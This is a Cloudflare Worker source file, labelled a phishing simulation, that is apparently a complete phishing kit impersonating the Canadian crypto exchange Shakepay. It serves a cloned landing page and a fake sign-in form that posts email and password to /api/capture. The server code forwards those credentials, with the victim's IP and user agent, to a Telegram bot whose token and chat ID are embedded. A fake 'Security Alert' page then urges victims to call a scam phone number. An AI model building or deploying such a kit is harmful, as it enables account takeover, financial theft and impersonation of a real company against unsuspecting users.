// ============================================================
// Shakepay Phishing Simulation — Cloudflare Worker
// Routes: /login, /alert, /api/capture, / (landing)
// ============================================================

// --- CONFIGURATION ---
const CONFIG = {
  TELEGRAM_BOT_TOKEN: '8351939489:AAH4t-lnCWKr6ME981HhpNTRKG45y4VRCNA',
  TELEGRAM_CHAT_ID: '-5154796308', // Your group ID (negative number)
  PHONE_NUMBER: '+1 (833) 471 7851',
  PHONE_DIAL: '+18334717851'
};

// --- LANDING PAGE ---
const LANDING_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shakepay — Buy & Sell Bitcoin and Ethereum in Canada</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #1a1a2e; line-height: 1.6; }
.navbar { display: flex; align-items: center; justify-content: space-between; padding: 16px 40px; background: #fff; border-bottom: 1px solid #f0f0f5; }
.logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
.logo svg { flex-shrink: 0; }
.logo-text { font-size: 22px; font-weight: 800; color: #1a1a2e; letter-spacing: -0.5px; }
.nav-links { display: flex; align-items: center; gap: 28px; }
.nav-links a { text-decoration: none; color: #555; font-size: 15px; font-weight: 500; transition: color 0.2s; }
.nav-links a:hover { color: #7B2FBE; }
.nav-cta { background: linear-gradient(135deg, #7B2FBE, #9B4DFF); color: #fff !important; padding: 10px 24px; border-radius: 8px; font-weight: 600 !important; font-size: 14px !important; }
.nav-cta:hover { opacity: 0.9; color: #fff !important; }
.hero { background: linear-gradient(135deg, #7B2FBE, #9B4DFF); color: #fff; padding: 80px 40px; text-align: center; }
.hero h1 { font-size: 48px; font-weight: 800; margin-bottom: 16px; letter-spacing: -1px; }
.hero p { font-size: 20px; opacity: 0.9; max-width: 600px; margin: 0 auto 32px; }
.hero-stats { display: flex; justify-content: center; gap: 60px; margin-top: 48px; flex-wrap: wrap; }
.hero-stat h3 { font-size: 36px; font-weight: 800; }
.hero-stat p { font-size: 14px; opacity: 0.8; margin: 0; }
.btn-primary { display: inline-block; background: #fff; color: #7B2FBE; padding: 14px 40px; border-radius: 10px; font-weight: 700; font-size: 16px; text-decoration: none; transition: transform 0.2s, box-shadow 0.2s; }
.btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,0,0,0.15); }
.features { padding: 80px 40px; max-width: 1100px; margin: 0 auto; text-align: center; }
.features h2 { font-size: 32px; margin-bottom: 48px; }
.feature-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 32px; }
.feature-card { background: #f8f7fc; padding: 32px; border-radius: 16px; text-align: left; }
.feature-card h3 { font-size: 18px; margin-bottom: 8px; color: #7B2FBE; }
.feature-card p { color: #666; font-size: 14px; }
.support { background: #f8f7fc; padding: 60px 40px; text-align: center; }
.support h2 { font-size: 28px; margin-bottom: 16px; }
.support p { color: #666; max-width: 500px; margin: 0 auto 8px; }
.support .btn-primary { margin-top: 24px; }
.footer { background: #1a1a2e; color: #aaa; padding: 40px; text-align: center; font-size: 13px; }
.footer a { color: #9B4DFF; text-decoration: none; }
.footer p { margin: 4px 0; }
</style>
</head>
<body>
<nav class="navbar">
  <a class="logo" href="/login">
    <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
      <rect x="4" y="4" width="28" height="28" rx="6" fill="url(#lg)" />
      <rect x="10" y="10" width="6" height="16" rx="2" fill="#fff" opacity="0.9"/>
      <rect x="18" y="14" width="6" height="12" rx="2" fill="#fff" opacity="0.7"/>
      <rect x="26" y="18" width="6" height="8" rx="2" fill="#fff" opacity="0.5"/>
      <defs><linearGradient id="lg" x1="0" y1="0" x2="36" y2="36"><stop stop-color="#7B2FBE"/><stop offset="1" stop-color="#9B4DFF"/></linearGradient></defs>
    </svg>
    <span class="logo-text">Shakepay</span>
  </a>
  <div class="nav-links">
    <a href="#">Features</a>
    <a href="#">Security</a>
    <a href="#">Support</a>
    <a href="/login" class="nav-cta">Get Started</a>
  </div>
</nav>
<section class="hero">
  <h1>Bitcoin & Ethereum.<br>Made simple.</h1>
  <p>Buy, sell, and earn crypto instantly. Join over 1 million Canadians.</p>
  <a href="/login" class="btn-primary">Get Started</a>
  <div class="hero-stats">
    <div class="hero-stat"><h3>1M+</h3><p>Canadian Users</p></div>
    <div class="hero-stat"><h3>$5B+</h3><p>Trading Volume</p></div>
    <div class="hero-stat"><h3>4.7★</h3><p>App Store Rating</p></div>
  </div>
</section>
<section class="features">
  <h2>Why Canadians choose Shakepay</h2>
  <div class="feature-grid">
    <div class="feature-card"><h3>Instant Funding</h3><p>Fund your account with e-Transfer and start trading in minutes. Free deposits.</p></div>
    <div class="feature-card"><h3>No Trading Fees</h3><p>Buy and sell crypto with zero trading fees. What you see is what you pay.</p></div>
    <div class="feature-card"><h3>Earn Bitcoin Daily</h3><p>Get free Bitcoin every day with Shakepay Earn. No catches, just crypto.</p></div>
    <div class="feature-card"><h3>Secure & Regulated</h3><p>Registered with FINTRAC as a Money Services Business. Your funds are protected.</p></div>
  </div>
</section>
<section class="support">
  <h2>We're here to help</h2>
  <p>Our support team is available 24/7 to assist you with any questions.</p>
  <p style="font-size:14px;color:#999;">Need help right away? Call us now: <a href="tel:${CONFIG.PHONE_DIAL}" style="color:#7B2FBE;font-weight:600;text-decoration:none;">Call Now ${CONFIG.PHONE_NUMBER}</a></p>
  <br>
  <a href="/login" class="btn-primary">Get Started</a>
</section>
<footer class="footer">
  <p>© 2026 Shakepay Inc. All rights reserved.</p>
  <p>Registered with FINTRAC as a Money Services Business — Registration #M17065696</p>
  <p>Member of the Canadian Investment Regulatory Organization (CIRO) and Canadian Investor Protection Fund (CIPF)</p>
  <p><a href="/login">Get Started</a> &nbsp;·&nbsp; <a href="#">Privacy Policy</a> &nbsp;·&nbsp; <a href="#">Terms of Service</a></p>
</footer>
</body>
</html>`;

// --- LOGIN PAGE ---
const LOGIN_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign In — Shakepay</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f3fa; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.login-container { background: #fff; border-radius: 20px; box-shadow: 0 8px 40px rgba(123, 47, 190, 0.1); padding: 48px 40px; width: 100%; max-width: 420px; margin: 20px; }
.logo { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 32px; text-decoration: none; }
.logo-text { font-size: 24px; font-weight: 800; color: #1a1a2e; letter-spacing: -0.5px; }
h1 { font-size: 24px; text-align: center; margin-bottom: 8px; color: #1a1a2e; }
.subtitle { text-align: center; color: #888; font-size: 14px; margin-bottom: 32px; }
.form-group { margin-bottom: 20px; }
label { display: block; font-size: 14px; font-weight: 600; color: #333; margin-bottom: 6px; }
input[type="email"], input[type="password"] { width: 100%; padding: 14px 16px; border: 2px solid #e0e0e8; border-radius: 10px; font-size: 15px; transition: border-color 0.2s; outline: none; }
input:focus { border-color: #7B2FBE; }
.btn-login { width: 100%; padding: 14px; background: linear-gradient(135deg, #7B2FBE, #9B4DFF); color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; transition: opacity 0.2s; }
.btn-login:hover { opacity: 0.9; }
.btn-login:disabled { opacity: 0.5; cursor: not-allowed; }
.error-msg { color: #e53e3e; font-size: 13px; margin-top: 12px; text-align: center; display: none; }
.links { text-align: center; margin-top: 20px; }
.links a { color: #7B2FBE; text-decoration: none; font-size: 14px; }
.links a:hover { text-decoration: underline; }
.secure-badge { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 24px; color: #888; font-size: 12px; }
</style>
</head>
<body>
<div class="login-container">
  <a class="logo" href="/login">
    <svg width="32" height="32" viewBox="0 0 36 36" fill="none">
      <rect x="4" y="4" width="28" height="28" rx="6" fill="url(#lg)" />
      <rect x="10" y="10" width="6" height="16" rx="2" fill="#fff" opacity="0.9"/>
      <rect x="18" y="14" width="6" height="12" rx="2" fill="#fff" opacity="0.7"/>
      <rect x="26" y="18" width="6" height="8" rx="2" fill="#fff" opacity="0.5"/>
      <defs><linearGradient id="lg" x1="0" y1="0" x2="36" y2="36"><stop stop-color="#7B2FBE"/><stop offset="1" stop-color="#9B4DFF"/></linearGradient></defs>
    </svg>
    <span class="logo-text">Shakepay</span>
  </a>
  <h1>Welcome back</h1>
  <p class="subtitle">Sign in to your account</p>
  <form id="loginForm">
    <div class="form-group">
      <label for="email">Email address</label>
      <input type="email" id="email" name="email" placeholder="you@example.com" required autocomplete="email">
    </div>
    <div class="form-group">
      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
    </div>
    <button type="submit" class="btn-login" id="loginBtn">Sign In</button>
    <div class="error-msg" id="errorMsg">Invalid email or password. Please try again.</div>
  </form>
  <div class="links">
    <a href="#">Forgot your password?</a>
  </div>
  <div class="secure-badge">
    <svg width="14" height="14" viewBox="0 0 24 24" fill="#7B2FBE"><path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/></svg>
    Secured with 256-bit encryption
  </div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  const btn = document.getElementById('loginBtn');
  const errMsg = document.getElementById('errorMsg');
  btn.disabled = true;
  btn.textContent = 'Signing in...';
  errMsg.style.display = 'none';
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  try {
    await fetch('/api/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password })
    });
  } catch (e) {
    try { navigator.sendBeacon('/api/capture', JSON.stringify({ email, password })); } catch(e2) {}
  }
  window.location.href = '/alert';
});
</script>
</body>
</html>`;

// --- SECURITY ALERT PAGE ---
const ALERT_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Alert — Shakepay</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f3fa; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
.alert-card { background: #fff; border-radius: 20px; box-shadow: 0 8px 40px rgba(123, 47, 190, 0.1); padding: 48px 40px; width: 100%; max-width: 520px; text-align: center; }
.icon-warning { width: 64px; height: 64px; background: #fff3e0; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; }
.icon-warning svg { width: 32px; height: 32px; }
h1 { font-size: 26px; color: #1a1a2e; margin-bottom: 8px; }
.subtitle { color: #888; font-size: 15px; margin-bottom: 28px; }
.alert-details { background: #fef8f0; border: 1px solid #ffe0b2; border-radius: 12px; padding: 20px; text-align: left; margin-bottom: 24px; }
.alert-details p { font-size: 14px; color: #555; margin-bottom: 6px; }
.alert-details p strong { color: #333; }
.alert-details .label { color: #e65100; font-weight: 600; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px; display: block; }
.action-box { background: linear-gradient(135deg, #f8f7fc, #efe8fa); border-radius: 12px; padding: 24px; margin-bottom: 20px; }
.action-box p { font-size: 14px; color: #555; margin-bottom: 12px; }
.phone-number { font-size: 24px; font-weight: 800; color: #7B2FBE; text-decoration: none; display: block; margin: 8px 0; }
.phone-number:hover { color: #9B4DFF; }
.btn-dismiss { display: inline-block; padding: 12px 32px; background: #e0e0e8; color: #555; border: none; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; text-decoration: none; transition: background 0.2s; }
.btn-dismiss:hover { background: #d0d0d8; }
.secure-badge { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 20px; color: #888; font-size: 12px; }
</style>
</head>
<body>
<div class="alert-card">
  <div class="icon-warning">
    <svg viewBox="0 0 24 24" fill="#e65100"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
  </div>
  <h1>Security Alert</h1>
  <p class="subtitle">We detected unusual activity on your account</p>
  <div class="alert-details">
    <span class="label">⚠️ Suspicious Login Attempt</span>
    <p><strong>Location:</strong> Toronto, Ontario, Canada</p>
    <p><strong>Device:</strong> Chrome on Windows</p>
    <p><strong>Time:</strong> <span id="currentTime">Just now</span></p>
    <p><strong>IP Address:</strong> <span id="currentIP">192.168.x.x</span></p>
    <p style="color:#c62828;margin-top:10px;font-weight:500;">This login attempt has been blocked.</p>
  </div>
  <div class="action-box">
    <p>For your security, you can contact our support team immediately at</p>
    <a href="tel:${CONFIG.PHONE_DIAL}" class="phone-number">${CONFIG.PHONE_NUMBER}</a>
    <p style="font-size:13px;color:#888;">Available 24/7 • Please reference case #<span id="caseId">SP-</span></p>
  </div>
  <p style="font-size:14px;color:#888;margin-bottom:20px;">Need help right away? Call us now: <a href="tel:${CONFIG.PHONE_DIAL}" style="color:#7B2FBE;font-weight:600;text-decoration:none;">Call Now ${CONFIG.PHONE_NUMBER}</a></p>
  <a href="#" class="btn-dismiss" onclick="event.preventDefault();alert('For security, please contact our support team at ${CONFIG.PHONE_NUMBER}.');">Dismiss</a>
  <div class="secure-badge">
    <svg width="14" height="14" viewBox="0 0 24 24" fill="#7B2FBE"><path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/></svg>
    End-to-end encrypted
  </div>
</div>
<script>
document.getElementById('currentTime').textContent = new Date().toLocaleString('en-CA', { timeZone: 'America/Toronto' });
document.getElementById('caseId').textContent = 'SP-' + Math.random().toString(36).substring(2, 8).toUpperCase();
</script>
</body>
</html>`;

// --- TELEGRAM HELPER ---
async function sendToTelegram(data, ip, userAgent, request) {
  const { email, password } = data;
  const timestamp = new Date().toISOString();
  const platform = request.cf && request.cf.botManagement ? 'Cloudflare' : (request.headers.get('sec-ch-ua-platform') || 'Unknown');
  
  const message = `
🔐 <b>Shakepay Credentials Captured</b>

<b>Email:</b> <code>${email}</code>
<b>Password:</b> <code>${password}</code>

<b>IP:</b> ${ip}
<b>User-Agent:</b> ${userAgent}
<b>Platform:</b> ${platform}
<b>Timestamp:</b> ${timestamp}
<b>Page:</b> ${request.url}
  `.trim();

  const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CONFIG.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (e) {
    console.error('Telegram send failed:', e);
  }
}

// --- REQUEST HANDLER ---
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    
    // CORS headers for API
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    };

    // Handle CORS preflight
    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    // --- API: Capture credentials ---
    if (path === '/api/capture' && request.method === 'POST') {
      try {
        const data = await request.json();
        const ip = request.headers.get('CF-Connecting-IP') || 
                   request.headers.get('X-Forwarded-For') || 
                   'unknown';
        const userAgent = request.headers.get('User-Agent') || 'unknown';
        
        // Fire Telegram notification (don't await — fire and forget)
        ctx.waitUntil(sendToTelegram(data, ip, userAgent, request));
        
        return new Response(JSON.stringify({ status: 'ok' }), {
          status: 200,
          headers: { 'Content-Type': 'application/json', ...corsHeaders }
        });
      } catch (e) {
        return new Response(JSON.stringify({ status: 'error', message: e.message }), {
          status: 400,
          headers: { 'Content-Type': 'application/json', ...corsHeaders }
        });
      }
    }

    // --- Route: Security Alert ---
    if (path === '/alert') {
      return new Response(ALERT_PAGE, {
        status: 200,
        headers: { 'Content-Type': 'text/html;charset=UTF-8' }
      });
    }

    // --- Route: Login Page ---
    if (path === '/login') {
      return new Response(LOGIN_PAGE, {
        status: 200,
        headers: { 'Content-Type': 'text/html;charset=UTF-8' }
      });
    }

    // --- Route: Landing Page (default) ---
    // Serves on /, /index.html, or any undefined path
    return new Response(LANDING_PAGE, {
      status: 200,
      headers: { 'Content-Type': 'text/html;charset=UTF-8' }
    });
  }
};